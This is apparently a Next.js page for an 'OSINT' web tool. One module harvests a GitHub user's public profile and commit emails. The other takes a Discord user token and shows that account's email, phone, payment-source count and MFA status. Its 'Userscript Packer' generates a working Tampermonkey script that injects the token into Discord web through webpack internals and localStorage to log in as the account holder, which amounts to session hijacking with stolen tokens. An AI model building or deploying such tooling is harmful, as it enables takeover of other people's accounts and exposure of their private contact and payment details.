import { useState } from 'react';
import Head from 'next/head';

const Icon = {
  menu: (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M3 12h18M3 6h18M3 18h18" />
    </svg>
  ),
  close: (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M18 6L6 18M6 6l12 12" />
    </svg>
  ),
  search: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <circle cx="11" cy="11" r="8" /><path d="M21 21l-4.35-4.35" />
    </svg>
  ),
  user: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" />
    </svg>
  ),
  mail: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
      <polyline points="22,6 12,13 2,6" />
    </svg>
  ),
  repo: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20" /><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z" />
    </svg>
  ),
  org: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M3 21h18M5 21V7l7-4 7 4v14M9 21v-6h6v6" />
    </svg>
  ),
  activity: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <polyline points="22 12 18 12 15 21 9 3 6 12 2 12" />
    </svg>
  ),
  gist: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
      <polyline points="14 2 14 8 20 8" />
    </svg>
  ),
  external: (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
      <polyline points="15 3 21 3 21 9" /><line x1="10" y1="14" x2="21" y2="3" />
    </svg>
  ),
  token: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
    </svg>
  ),
  discord: (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
      <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/>
    </svg>
  ),
  copy: (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  ),
  script: (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <polyline points="16 18 22 12 16 6" /><polyline points="8 6 2 12 8 18" />
    </svg>
  ),
};

const GH_TABS = [
  { id: 'overview', label: 'Overview', icon: Icon.user },
  { id: 'emails', label: 'Emails', icon: Icon.mail },
  { id: 'repos', label: 'Repos', icon: Icon.repo },
  { id: 'orgs', label: 'Orgs', icon: Icon.org },
  { id: 'gists', label: 'Gists', icon: Icon.gist },
  { id: 'activity', label: 'Activity', icon: Icon.activity },
];

function BlurReveal({ value }) {
  const [revealed, setRevealed] = useState(false);
  if (!value) return <span className="muted">—</span>;
  return (
    <span className="private-wrap">
      <span className={revealed ? 'private-value revealed' : 'private-value'}>{value}</span>
      {!revealed && (
        <button type="button" className="reveal" onClick={() => setRevealed(true)}>
          Click to reveal
        </button>
      )}
    </span>
  );
}

function buildUserscript(tok, username) {
  const safeName = (username || 'discord').replace(/[^a-zA-Z0-9_-]/g, '');
  return `// ==UserScript==
// @name         Discord Auto Login — ${safeName}
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Auto-injects Discord token and logs in
// @author       OSINT
// @match        https://discord.com/*
// @match        https://discordapp.com/*
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
  'use strict';
  const TOKEN = ${JSON.stringify(tok)};

  function setToken() {
    try {
      // webpack chunk grabber (works on current Discord web)
      window.webpackChunkdiscord_app = window.webpackChunkdiscord_app || [];
      window.webpackChunkdiscord_app.push([
        [Math.random()],
        {},
        (req) => {
          for (const m of Object.values(req.c)) {
            if (m?.exports?.default?.getToken) {
              // already logged
              return;
            }
            if (m?.exports?.default?.loginToken) {
              m.exports.default.loginToken(TOKEN);
              return;
            }
          }
        },
      ]);
    } catch (e) {}

    // fallback: localStorage + reload
    try {
      localStorage.setItem('token', JSON.stringify(TOKEN));
    } catch (e) {}
  }

  // inject early
  setToken();

  // also try after load
  window.addEventListener('load', () => {
    setTimeout(setToken, 800);
  });

  // iframe / client redirect helper
  if (location.pathname === '/login' || location.pathname === '/register') {
    setTimeout(() => {
      location.href = 'https://discord.com/app';
    }, 1200);
  }
})();
`;
}

export default function Home() {
  const [module, setModule] = useState('github');
  const [sidebarOpen, setSidebarOpen] = useState(true);

  const [username, setUsername] = useState('');
  const [ghLoading, setGhLoading] = useState(false);
  const [ghData, setGhData] = useState(null);
  const [ghError, setGhError] = useState(null);
  const [ghTab, setGhTab] = useState('overview');

  const [token, setToken] = useState('');
  const [dcLoading, setDcLoading] = useState(false);
  const [dcData, setDcData] = useState(null);
  const [dcError, setDcError] = useState(null);
  const [copied, setCopied] = useState(false);

  async function runGithub(e) {
    e.preventDefault();
    if (!username.trim()) return;
    setGhLoading(true);
    setGhError(null);
    setGhData(null);
    setGhTab('overview');
    try {
      const res = await fetch('/api/osint', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username.trim() }),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || 'Failed');
      setGhData(json);
    } catch (err) {
      setGhError(err.message);
    } finally {
      setGhLoading(false);
    }
  }

  async function runDiscord(e) {
    e.preventDefault();
    if (!token.trim()) return;
    setDcLoading(true);
    setDcError(null);
    setDcData(null);
    setCopied(false);
    try {
      const res = await fetch('/api/discord', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: token.trim() }),
      });
      const json = await res.json();
      if (!res.ok) throw new Error(json.error || 'Failed');
      setDcData(json);
    } catch (err) {
      setDcError(err.message);
    } finally {
      setDcLoading(false);
    }
  }

  function copyUserscript() {
    if (!token.trim() || !dcData) return;
    const script = buildUserscript(token.trim(), dcData.username);
    navigator.clipboard.writeText(script).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }

  const nitroLabel = (t) => {
    if (t === 1) return 'Nitro Classic';
    if (t === 2) return 'Nitro';
    if (t === 3) return 'Nitro Basic';
    return 'None';
  };

  return (
    <>
      <Head>
        <title>OSINT</title>
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
        />
        <style>{`
          .private-wrap {
            position: relative;
            display: block;
            max-width: 100%;
            min-height: 22px;
          }
          .private-value {
            display: block;
            filter: blur(6px);
            user-select: none;
            cursor: pointer;
            font-size: 12px;
            font-weight: 700;
            overflow-wrap: anywhere;
            line-height: 1.4;
            color: #eee;
          }
          .private-value.revealed {
            filter: none !important;
            user-select: text;
          }
          .reveal {
            position: absolute;
            inset: 0;
            display: grid;
            place-items: center;
            border: 0 !important;
            background: transparent !important;
            color: #aaa !important;
            font-size: 9px !important;
            font-weight: 700 !important;
            letter-spacing: 0.04em;
            padding: 0 !important;
            margin: 0 !important;
            font-family: inherit;
            cursor: pointer;
            z-index: 2;
          }
          .reveal:hover { color: #fff !important; }
          input, textarea, select {
            font-size: 16px !important;
          }
        `}</style>
      </Head>

      <div className={`app ${sidebarOpen ? '' : 'sidebar-collapsed'}`}>
        <aside className="sidebar">
          <div className="sidebar-head">
            <span className="logo">OSINT</span>
            <button className="icon-btn" onClick={() => setSidebarOpen(false)}>{Icon.close}</button>
          </div>

          <nav className="sidebar-nav">
            <div className="nav-section">Modules</div>
            <button
              className={`nav-item ${module === 'github' ? 'active' : ''}`}
              onClick={() => setModule('github')}
            >
              {Icon.user}
              <span>GitHub Lookup</span>
            </button>
            <button
              className={`nav-item ${module === 'discord' ? 'active' : ''}`}
              onClick={() => setModule('discord')}
            >
              {Icon.discord}
              <span>Token Lookup</span>
            </button>
          </nav>

          <div className="sidebar-foot">
            <span className="muted">public sources · blurred fields</span>
          </div>
        </aside>

        <main className="main">
          <header className="topbar">
            {!sidebarOpen && (
              <button className="icon-btn" onClick={() => setSidebarOpen(true)}>{Icon.menu}</button>
            )}

            {module === 'github' && (
              <form onSubmit={runGithub} className="search">
                <span className="search-icon">{Icon.search}</span>
                <input
                  type="text"
                  placeholder="GitHub username..."
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  disabled={ghLoading}
                />
                <button type="submit" disabled={ghLoading || !username.trim()}>
                  {ghLoading ? 'Scanning' : 'Gather'}
                </button>
              </form>
            )}

            {module === 'discord' && (
              <form onSubmit={runDiscord} className="search">
                <span className="search-icon">{Icon.token}</span>
                <input
                  type="password"
                  placeholder="Paste Discord user token..."
                  value={token}
                  onChange={(e) => setToken(e.target.value)}
                  disabled={dcLoading}
                  autoComplete="off"
                />
                <button type="submit" disabled={dcLoading || !token.trim()}>
                  {dcLoading ? 'Checking' : 'Lookup'}
                </button>
              </form>
            )}
          </header>

          {module === 'github' && (
            <>
              {ghError && <div className="banner error">{ghError}</div>}

              {!ghData && !ghLoading && !ghError && (
                <div className="empty-state">
                  <div className="empty-icon">{Icon.search}</div>
                  <h2>GitHub Lookup</h2>
                  <p>Enter a username to pull public profile, emails, repos and activity.</p>
                </div>
              )}

              {ghLoading && (
                <div className="empty-state">
                  <div className="spinner" />
                  <p>Gathering public intel...</p>
                </div>
              )}

              {ghData && (
                <div className="content">
                  <div className="profile-strip">
                    <img src={ghData.profile.avatar_url} alt="" className="avatar" />
                    <div className="identity">
                      <div className="name">{ghData.profile.name || ghData.profile.login}</div>
                      <div className="handle">@{ghData.profile.login}</div>
                    </div>
                    <div className="stats">
                      <div className="stat">
                        <span className="stat-label">Repositories</span>
                        <span className="stat-value">{ghData.profile.public_repos}</span>
                      </div>
                      <div className="stat">
                        <span className="stat-label">Emails</span>
                        <span className="stat-value">{ghData.emails.length}</span>
                      </div>
                      <div className="stat">
                        <span className="stat-label">Followers</span>
                        <span className="stat-value">{ghData.profile.followers}</span>
                      </div>
                    </div>
                    <a href={ghData.profile.html_url} target="_blank" rel="noreferrer" className="btn-outline">
                      Open profile {Icon.external}
                    </a>
                  </div>

                  <div className="tabs">
                    {GH_TABS.map((t) => (
                      <button
                        key={t.id}
                        className={`tab ${ghTab === t.id ? 'active' : ''}`}
                        onClick={() => setGhTab(t.id)}
                      >
                        {t.icon}
                        <span>{t.label}</span>
                        {t.id === 'emails' && ghData.emails.length > 0 && (
                          <span className="badge">{ghData.emails.length}</span>
                        )}
                        {t.id === 'repos' && <span className="badge">{ghData.repos.length}</span>}
                      </button>
                    ))}
                  </div>

                  <div className="panel">
                    {ghTab === 'overview' && (
                      <div className="grid-cards">
                        <div className="info-card"><div className="info-label">User ID</div><div className="info-value">{ghData.profile.id}</div></div>
                        <div className="info-card"><div className="info-label">Created</div><div className="info-value">{new Date(ghData.profile.created_at).toLocaleDateString()}</div></div>
                        <div className="info-card"><div className="info-label">Location</div><div className="info-value">{ghData.profile.location || '—'}</div></div>
                        <div className="info-card"><div className="info-label">Company</div><div className="info-value">{ghData.profile.company || '—'}</div></div>
                        <div className="info-card"><div className="info-label">Blog</div><div className="info-value">{ghData.profile.blog ? <a href={ghData.profile.blog} target="_blank" rel="noreferrer">{ghData.profile.blog}</a> : '—'}</div></div>
                        <div className="info-card"><div className="info-label">Twitter</div><div className="info-value">{ghData.profile.twitter ? `@${ghData.profile.twitter}` : '—'}</div></div>
                        <div className="info-card wide"><div className="info-label">Bio</div><div className="info-value">{ghData.profile.bio || '—'}</div></div>
                        {ghData.profile.email && (
                          <div className="info-card wide"><div className="info-label">Public Profile Email</div><BlurReveal value={ghData.profile.email} /></div>
                        )}
                      </div>
                    )}

                    {ghTab === 'emails' && (
                      <div className="email-list">
                        {ghData.emails.length === 0 ? (
                          <div className="empty-panel">No real emails found in public commits</div>
                        ) : (
                          ghData.emails.map((email) => (
                            <div key={email} className="email-row">
                              <div className="email-label">Public Commit Email</div>
                              <BlurReveal value={email} />
                            </div>
                          ))
                        )}
                        {ghData.commitAuthors.length > 0 && (
                          <div className="authors">
                            <div className="section-title">Commit Authors</div>
                            {ghData.commitAuthors.map((a) => (
                              <div key={a} className="author-row"><BlurReveal value={a} /></div>
                            ))}
                          </div>
                        )}
                      </div>
                    )}

                    {ghTab === 'repos' && (
                      <div className="repo-list">
                        {ghData.repos.length === 0 ? <div className="empty-panel">No public repositories</div> :
                          ghData.repos.map((r) => (
                            <a key={r.full_name} href={r.html_url} target="_blank" rel="noreferrer" className="repo-card">
                              <div className="repo-name">{r.name}</div>
                              {r.description && <div className="repo-desc">{r.description}</div>}
                              <div className="repo-meta">
                                {r.language && <span>{r.language}</span>}
                                <span>{r.stargazers_count} stars</span>
                                <span>{r.forks_count} forks</span>
                                {r.fork && <span className="tag">fork</span>}
                                {r.archived && <span className="tag">archived</span>}
                              </div>
                            </a>
                          ))}
                      </div>
                    )}

                    {ghTab === 'orgs' && (
                      <div className="simple-list">
                        {ghData.orgs.length === 0 ? <div className="empty-panel">No public organizations</div> :
                          ghData.orgs.map((o) => (
                            <a key={o.login} href={o.html_url} target="_blank" rel="noreferrer" className="simple-row">
                              <span>{o.login}</span>
                              {o.description && <span className="muted">{o.description}</span>}
                            </a>
                          ))}
                      </div>
                    )}

                    {ghTab === 'gists' && (
                      <div className="simple-list">
                        {ghData.gists.length === 0 ? <div className="empty-panel">No public gists</div> :
                          ghData.gists.map((g) => (
                            <a key={g.id} href={g.html_url} target="_blank" rel="noreferrer" className="simple-row">
                              <span>{g.description || g.files.join(', ') || g.id}</span>
                            </a>
                          ))}
                      </div>
                    )}

                    {ghTab === 'activity' && (
                      <div className="activity-list">
                        {ghData.recentActivity.length === 0 ? <div className="empty-panel">No recent public activity</div> :
                          ghData.recentActivity.map((a, i) => (
                            <div key={i} className="activity-row">
                              <span className="act-type">{a.type.replace('Event', '')}</span>
                              {a.repo && <span className="act-repo">{a.repo}</span>}
                              {a.payload_summary && <span className="muted">{a.payload_summary}</span>}
                              <span className="act-time">{new Date(a.created_at).toLocaleString()}</span>
                            </div>
                          ))}
                      </div>
                    )}
                  </div>

                  <div className="rate-line">Rate remaining: {ghData.rateLimit?.remaining ?? '—'}</div>
                </div>
              )}
            </>
          )}

          {module === 'discord' && (
            <>
              {dcError && <div className="banner error">{dcError}</div>}

              {!dcData && !dcLoading && !dcError && (
                <div className="empty-state">
                  <div className="empty-icon">{Icon.discord}</div>
                  <h2>Token Lookup</h2>
                  <p>Paste a Discord user token to fetch account email and phone.</p>
                </div>
              )}

              {dcLoading && (
                <div className="empty-state">
                  <div className="spinner" />
                  <p>Checking token...</p>
                </div>
              )}

              {dcData && (
                <div className="content">
                  <div className="profile-strip">
                    {dcData.avatar ? (
                      <img src={dcData.avatar} alt="" className="avatar" />
                    ) : (
                      <div className="avatar placeholder">{Icon.discord}</div>
                    )}
                    <div className="identity">
                      <div className="name">{dcData.global_name || dcData.username}</div>
                      <div className="handle">
                        {dcData.discriminator && dcData.discriminator !== '0'
                          ? `${dcData.username}#${dcData.discriminator}`
                          : `@${dcData.username}`}
                      </div>
                    </div>
                    <div className="stats">
                      <div className="stat">
                        <span className="stat-label">Guilds</span>
                        <span className="stat-value">{dcData.guild_count}</span>
                      </div>
                      <div className="stat">
                        <span className="stat-label">Nitro</span>
                        <span className="stat-value">{nitroLabel(dcData.premium_type)}</span>
                      </div>
                      <div className="stat">
                        <span className="stat-label">MFA</span>
                        <span className="stat-value">{dcData.mfa_enabled ? 'On' : 'Off'}</span>
                      </div>
                    </div>
                  </div>

                  <div className="panel">
                    <div className="grid-cards">
                      <div className="info-card">
                        <div className="info-label">User ID</div>
                        <div className="info-value">{dcData.id}</div>
                      </div>
                      <div className="info-card">
                        <div className="info-label">Verified</div>
                        <div className="info-value">{dcData.verified ? 'Yes' : 'No'}</div>
                      </div>
                      <div className="info-card">
                        <div className="info-label">Locale</div>
                        <div className="info-value">{dcData.locale || '—'}</div>
                      </div>
                      <div className="info-card">
                        <div className="info-label">Payment Sources</div>
                        <div className="info-value">{dcData.payment_sources}</div>
                      </div>
                      <div className="info-card wide">
                        <div className="info-label">Email</div>
                        <BlurReveal value={dcData.email} />
                      </div>
                      <div className="info-card wide">
                        <div className="info-label">Phone</div>
                        <BlurReveal value={dcData.phone} />
                      </div>
                    </div>
                  </div>

                  {/* USERSCRIPT PACKER */}
                  <div className="script-card">
                    <div className="script-head">
                      <span className="script-icon">{Icon.script}</span>
                      <div>
                        <div className="script-title">Userscript Packer</div>
                        <div className="script-sub">Tampermonkey / Stay · auto-login Discord</div>
                      </div>
                    </div>
                    <p className="script-desc">
                      Generates a userscript that injects this token and logs you into Discord web automatically.
                    </p>
                    <button type="button" className="script-btn" onClick={copyUserscript}>
                      {Icon.copy}
                      <span>{copied ? 'Copied' : 'Copy Userscript'}</span>
                    </button>
                  </div>
                </div>
              )}
            </>
          )}
        </main>
      </div>

      <style jsx global>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
          font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
          background: #000;
          color: #eee;
          min-height: 100vh;
        }
        a { color: #aaa; text-decoration: none; }
        a:hover { color: #fff; }
        button { font-family: inherit; }
      `}</style>

      <style jsx>{`
        .app { display: flex; min-height: 100vh; }

        .sidebar {
          width: 240px;
          background: rgba(5,5,5,.96);
          border-right: 1px solid #1b1b1b;
          display: flex;
          flex-direction: column;
          transition: width 0.2s ease;
          flex-shrink: 0;
        }
        .sidebar-collapsed .sidebar { width: 0; overflow: hidden; border: none; }
        .sidebar-head {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 18px 16px;
          border-bottom: 1px solid #191919;
        }
        .logo { font-weight: 900; letter-spacing: 0.16em; font-size: 14px; color: #fff; }
        .sidebar-nav { flex: 1; padding: 12px 10px; }
        .nav-section {
          font-size: 9px;
          text-transform: uppercase;
          letter-spacing: 0.13em;
          color: #444;
          padding: 8px 10px 6px;
          font-weight: 800;
        }
        .nav-item {
          display: flex;
          align-items: center;
          gap: 11px;
          width: 100%;
          padding: 11px 12px;
          border: 1px solid #222;
          background: #0b0b0b;
          color: #eee;
          border-radius: 10px;
          cursor: pointer;
          font-size: 13px;
          text-align: left;
          margin-bottom: 8px;
        }
        .nav-item:hover { border-color: #333; }
        .nav-item.active { border-color: #444; background: #111; }
        .sidebar-foot {
          padding: 16px;
          border-top: 1px solid #191919;
          font-size: 9px;
          color: #444;
        }

        .main { flex: 1; display: flex; flex-direction: column; min-width: 0; background: #000; }
        .topbar {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 14px 20px;
          border-bottom: 1px solid #1b1b1b;
          background: #050505;
        }
        .icon-btn {
          display: flex; align-items: center; justify-content: center;
          width: 34px; height: 34px;
          border: 1px solid #242424;
          background: #090909;
          color: #aaa;
          border-radius: 9px;
          cursor: pointer;
        }
        .icon-btn:hover { color: #fff; border-color: #333; }

        .search {
          display: flex; align-items: center; flex: 1; max-width: 560px;
          background: #070707;
          border: 1px solid #252525;
          border-radius: 13px;
          overflow: hidden;
          padding: 4px; gap: 4px;
        }
        .search-icon { padding: 0 10px; color: #444; display: flex; }
        .search input {
          flex: 1; border: none; background: #030303; color: #fff;
          padding: 11px 12px; font-size: 16px; outline: none;
          border-radius: 9px; font-family: inherit;
        }
        .search button {
          border: 1px solid #444; background: #f2f2f2; color: #000;
          padding: 11px 18px; font-size: 11px; font-weight: 900;
          cursor: pointer; border-radius: 9px; font-family: inherit;
        }
        .search button:hover:not(:disabled) { background: #fff; }
        .search button:disabled { opacity: 0.4; cursor: not-allowed; }

        .banner.error {
          margin: 16px 20px 0; padding: 11px;
          background: #100606; border: 1px solid #3a1717;
          color: #ff9b9b; border-radius: 9px; font-size: 11px;
        }

        .empty-state {
          flex: 1; display: flex; flex-direction: column;
          align-items: center; justify-content: center; gap: 10px; color: #444;
        }
        .empty-icon { opacity: 0.35; }
        .empty-state h2 { color: #eee; font-size: 16px; font-weight: 800; }
        .empty-state p { font-size: 12px; }
        .spinner {
          width: 22px; height: 22px;
          border: 2px solid #222; border-top-color: #666;
          border-radius: 50%; animation: spin 0.7s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .content {
          padding: 20px; display: flex; flex-direction: column;
          gap: 12px; max-width: 820px;
        }

        .profile-strip {
          display: flex; align-items: center; gap: 14px;
          background: #050505; border: 1px solid #242424;
          border-radius: 13px; padding: 16px 18px; flex-wrap: wrap;
        }
        .avatar {
          width: 54px; height: 54px; border-radius: 50%;
          object-fit: cover; border: 1px solid #333; background: #111;
        }
        .avatar.placeholder {
          display: flex; align-items: center; justify-content: center; color: #555;
        }
        .identity { min-width: 100px; }
        .name { font-weight: 800; font-size: 16px; color: #eee; }
        .handle { font-size: 10px; color: #666; margin-top: 3px; }
        .stats { display: flex; gap: 20px; margin-left: auto; }
        .stat { text-align: left; }
        .stat-label {
          display: block; font-size: 8px; text-transform: uppercase;
          letter-spacing: 0.13em; color: #555; font-weight: 800; margin-bottom: 4px;
        }
        .stat-value { font-size: 14px; font-weight: 800; color: #eee; }
        .btn-outline {
          display: inline-flex; align-items: center; gap: 6px;
          padding: 8px 12px; border: 1px solid #333; border-radius: 9px;
          font-size: 10px; color: #ccc; background: transparent;
        }
        .btn-outline:hover { border-color: #555; color: #fff; }

        .tabs {
          display: flex; gap: 4px; background: #050505;
          border: 1px solid #242424; border-radius: 12px;
          padding: 4px; overflow-x: auto;
        }
        .tab {
          display: flex; align-items: center; gap: 7px;
          padding: 9px 12px; border: none; background: transparent;
          color: #555; border-radius: 8px; font-size: 11px;
          cursor: pointer; white-space: nowrap; font-family: inherit;
        }
        .tab:hover { color: #aaa; background: #0b0b0b; }
        .tab.active { background: #111; color: #eee; border: 1px solid #333; }
        .badge {
          background: #1a1a1a; color: #777; font-size: 10px;
          padding: 1px 6px; border-radius: 8px; font-weight: 700;
        }

        .panel {
          background: #050505; border: 1px solid #242424;
          border-radius: 13px; padding: 16px; min-height: 180px;
        }

        .grid-cards {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
          gap: 1px; background: #202020;
        }
        .info-card { background: #050505; padding: 13px 15px; min-height: 63px; }
        .info-card.wide { grid-column: 1 / -1; }
        .info-label {
          font-size: 8px; text-transform: uppercase; letter-spacing: 0.13em;
          color: #555; font-weight: 800; margin-bottom: 6px;
        }
        .info-value {
          font-size: 11px; color: #eee; overflow-wrap: anywhere; line-height: 1.4;
        }

        .email-list { display: flex; flex-direction: column; gap: 7px; }
        .email-row {
          padding: 11px 12px; background: #070707;
          border: 1px solid #181818; border-radius: 9px;
        }
        .email-label {
          font-size: 8px; text-transform: uppercase; letter-spacing: 0.13em;
          color: #555; font-weight: 800; margin-bottom: 6px;
        }
        .authors { margin-top: 14px; }
        .section-title {
          font-size: 8px; text-transform: uppercase; letter-spacing: 0.13em;
          color: #555; font-weight: 800; margin-bottom: 8px;
        }
        .author-row { margin-bottom: 7px; }

        .repo-list {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
          gap: 8px;
        }
        .repo-card {
          display: block; background: #070707;
          border: 1px solid #181818; border-radius: 9px; padding: 12px;
        }
        .repo-card:hover { border-color: #333; }
        .repo-name { font-weight: 700; font-size: 12px; color: #eee; }
        .repo-desc { font-size: 10px; color: #555; margin: 5px 0; line-height: 1.35; }
        .repo-meta { display: flex; flex-wrap: wrap; gap: 8px; font-size: 10px; color: #444; }
        .tag { background: #111; padding: 1px 5px; border-radius: 4px; font-size: 9px; }

        .simple-list { display: flex; flex-direction: column; gap: 6px; }
        .simple-row {
          display: flex; gap: 10px; padding: 11px 12px;
          background: #070707; border: 1px solid #181818;
          border-radius: 9px; font-size: 11px;
        }
        .simple-row:hover { border-color: #333; }

        .activity-list { display: flex; flex-direction: column; gap: 2px; }
        .activity-row {
          display: flex; align-items: center; gap: 10px;
          padding: 9px 10px; border-bottom: 1px solid #141414; font-size: 11px;
        }
        .act-type { min-width: 70px; color: #777; font-weight: 700; }
        .act-repo { color: #eee; }
        .act-time { margin-left: auto; color: #444; font-size: 10px; }

        .empty-panel { text-align: center; color: #444; padding: 36px 16px; font-size: 11px; }
        .muted { color: #444; }
        .rate-line { text-align: center; font-size: 9px; color: #333; }

        /* USERSCRIPT CARD */
        .script-card {
          background: #050505;
          border: 1px solid #242424;
          border-radius: 13px;
          padding: 16px 18px;
        }
        .script-head {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 10px;
        }
        .script-icon {
          width: 36px;
          height: 36px;
          border: 1px solid #292929;
          border-radius: 9px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #aaa;
          background: #0b0b0b;
        }
        .script-title {
          font-size: 13px;
          font-weight: 800;
          color: #eee;
        }
        .script-sub {
          font-size: 10px;
          color: #555;
          margin-top: 2px;
        }
        .script-desc {
          font-size: 11px;
          color: #666;
          line-height: 1.45;
          margin-bottom: 14px;
        }
        .script-btn {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          border: 1px solid #333;
          background: #111;
          color: #eee;
          padding: 10px 16px;
          border-radius: 9px;
          font-size: 11px;
          font-weight: 700;
          cursor: pointer;
          font-family: inherit;
        }
        .script-btn:hover {
          border-color: #555;
          background: #161616;
        }

        @media (max-width: 700px) {
          .stats { margin-left: 0; width: 100%; justify-content: space-between; }
          .profile-strip { gap: 12px; }
        }
      `}</style>
    </>
  );
}